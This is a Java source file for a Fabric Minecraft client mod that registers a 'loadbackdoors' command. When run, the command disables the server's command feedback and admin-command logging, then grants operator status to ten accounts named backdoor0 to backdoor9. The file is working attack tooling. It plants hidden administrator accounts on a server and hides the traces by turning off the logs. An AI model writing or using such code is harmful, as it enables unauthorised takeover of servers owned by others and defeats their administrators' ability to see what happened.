package org.vortex.impersonate.client.commands;
import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.context.CommandContext;
import net.fabricmc.fabric.api.client.command.v2.ClientCommandManager;
import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.ClientPlayNetworkHandler;

public class loadbackdoors {

    public static void register(CommandDispatcher<FabricClientCommandSource> dispatcher) {
        dispatcher.register(ClientCommandManager.literal("loadbackdoors")
                .executes(loadbackdoors::execute));
    }

    public static int execute(CommandContext<FabricClientCommandSource> context) {
        MinecraftClient client = MinecraftClient.getInstance();
        ClientPlayNetworkHandler networkHandler = client.getNetworkHandler();
        assert networkHandler != null;
        networkHandler.sendChatCommand("gamerule sendCommandFeedback false");
        networkHandler.sendChatCommand("gamerule logAdminCommands false");
        networkHandler.sendChatCommand("op backdoor0");
        networkHandler.sendChatCommand("op backdoor1");
        networkHandler.sendChatCommand("op backdoor2");
        networkHandler.sendChatCommand("op backdoor3");
        networkHandler.sendChatCommand("op backdoor4");
        networkHandler.sendChatCommand("op backdoor5");
        networkHandler.sendChatCommand("op backdoor6");
        networkHandler.sendChatCommand("op backdoor7");
        networkHandler.sendChatCommand("op backdoor8");
        networkHandler.sendChatCommand("op backdoor9");

        return 1;
    }
}